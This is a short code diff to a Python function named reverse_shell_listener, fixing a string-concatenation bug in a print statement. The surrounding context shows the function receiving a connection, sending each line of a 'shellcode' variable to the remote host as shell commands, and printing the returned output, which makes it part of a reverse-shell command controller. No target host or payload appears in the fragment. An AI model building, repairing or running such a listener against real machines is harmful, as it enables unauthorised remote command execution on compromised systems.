@@ -27,7 +27,7 @@ def reverse_shell_listener():
 		data = conn.recv(1024).decode("UTF-8") # Inital Connect
 		codelines=shellcode.split("\n")
 		for line in codelines:
-			print("Sending: "line)
+			print("Sending: " + line)
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
 			data = conn.recv(1024).decode("UTF-8") # Receive output from command.
 			print(data) # Print the output of the command.
